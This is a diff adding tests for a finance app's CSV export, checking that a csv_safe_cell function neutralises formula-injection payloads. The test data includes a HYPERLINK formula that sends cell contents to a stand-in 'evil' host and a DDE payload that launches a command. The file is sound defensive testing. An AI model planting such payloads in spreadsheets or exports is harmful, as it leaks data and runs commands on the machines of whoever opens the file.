@@ -23,6 +23,7 @@ from app.services.branding import get_brand_context
 from app.services.report_export import (
     EXPORTERS,
     brand_provenance_header,
+    csv_safe_cell,
     export_aging_snapshot,
     export_cashflow_forecast,
     export_invoice_register,
@@ -398,3 +399,46 @@ def test_brand_provenance_sanitizes_org_name_newline_injection():
     org_lines = [ln for ln in header.splitlines() if ln.startswith("# Organization:")]
     assert len(org_lines) == 1
     assert "Injected: evil" in org_lines[0]  # folded onto one line, not a new row
+
+
+# ---------------------------------------------------------------------------
+# CSV formula-injection defense (CWE-1236, issue #172)
+# ---------------------------------------------------------------------------
+
+
+def test_csv_safe_cell_neutralizes_formula_leads():
+    for payload in (
+        '=HYPERLINK("http://evil/"&A1,"click")',
+        "+1+1",
+        "@SUM(A1:A9)",
+        "=cmd|'/c calc'!A1",
+        "\ttabbed",
+        "\rcarriage",
+    ):
+        out = csv_safe_cell(payload)
+        assert out == "'" + payload, payload
+
+
+def test_csv_safe_cell_preserves_plain_values_and_numbers():
+    # Ordinary text and bare (signed) numbers are untouched so numeric columns
+    # still parse.
+    assert csv_safe_cell("Acme Supply") == "Acme Supply"
+    assert csv_safe_cell("-42.50") == "-42.50"
+    assert csv_safe_cell("+5") == "+5"
+    assert csv_safe_cell("123.45") == "123.45"
+    # Non-strings pass straight through.
+    assert csv_safe_cell(7) == 7
+    assert csv_safe_cell(None) is None
+
+
+def test_vendor_spend_export_quotes_malicious_vendor_name():
+    """A vendor that names itself with a formula can't execute in a CFO's Excel —
+    the exported cell is prefixed with a single quote."""
+    evil = '=HYPERLINK("http://evil/"&A1,"x")'
+    csv_text = export_vendor_spend([(evil, 3, Decimal("100.00"))])
+    rows = _read(csv_text)
+    assert rows[0] == ["vendor_name", "invoice_count", "total_amount"]
+    assert rows[1][0] == "'" + evil
+    # A legitimate negative total is still a parseable number.
+    csv_text2 = export_vendor_spend([("Acme", 1, Decimal("-42.50"))])
+    assert _read(csv_text2)[1] == ["Acme", "1", "-42.50"]
